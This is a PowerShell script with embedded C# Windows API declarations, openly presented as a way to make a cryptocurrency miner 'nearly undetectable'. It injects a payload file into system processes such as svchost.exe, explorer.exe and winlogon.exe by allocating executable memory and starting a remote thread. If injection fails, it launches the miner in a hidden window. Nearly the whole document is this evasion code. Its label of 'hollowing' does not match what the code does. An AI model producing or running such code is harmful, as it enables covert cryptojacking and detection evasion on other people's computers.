# BEAST MODE: Advanced Process Injection & Hollowing
# This makes your miner nearly undetectable by running inside legitimate Windows processes

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class ProcessInjection
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);
}
"@

function Invoke-ProcessHollowing {
    param(
        [string]$TargetProcess = "svchost.exe",
        [string]$PayloadPath
    )
    
    try {
        # Find target process
        $processes = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue | Where-Object {$_.WorkingSet -gt 10MB}
        if (-not $processes) {
            return $false
        }
        
        $targetProc = $processes | Get-Random
        
        # Read payload
        if (-not (Test-Path $PayloadPath)) {
            return $false
        }
        
        $payloadBytes = [System.IO.File]::ReadAllBytes($PayloadPath)
        
        # Open target process
        $hProcess = [ProcessInjection]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
        if ($hProcess -eq [IntPtr]::Zero) {
            return $false
        }
        
        # Allocate memory in target
        $allocMem = [ProcessInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $payloadBytes.Length, 0x3000, 0x40)
        if ($allocMem -eq [IntPtr]::Zero) {
            return $false
        }
        
        # Write payload to target
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [ProcessInjection]::WriteProcessMemory($hProcess, $allocMem, $payloadBytes, $payloadBytes.Length, [ref]$bytesWritten)
        
        if ($writeResult) {
            # Create remote thread
            $hThread = [ProcessInjection]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            return ($hThread -ne [IntPtr]::Zero)
        }
        
        return $false
    }
    catch {
        return $false
    }
}

function Start-StealthMiner {
    param(
        [string]$MinerPath,
        [string]$ConfigPath
    )
    
    $stealthTargets = @("svchost.exe", "explorer.exe", "dwm.exe", "winlogon.exe", "csrss.exe")
    
    foreach ($target in $stealthTargets) {
        if (Invoke-ProcessHollowing -TargetProcess $target -PayloadPath $MinerPath) {
            return $true
        }
    }
    
    # Fallback to normal execution if injection fails
    try {
        Start-Process -FilePath $MinerPath -ArgumentList "--config=$ConfigPath" -WindowStyle Hidden
        return $true
    }
    catch {
        return $false
    }
}

# Main execution
if ($args.Count -ge 2) {
    $minerPath = $args[0]
    $configPath = $args[1]
    
    if (Start-StealthMiner -MinerPath $minerPath -ConfigPath $configPath) {
        Write-Output "Stealth injection successful"
    } else {
        Write-Output "Stealth injection failed"
    }
}
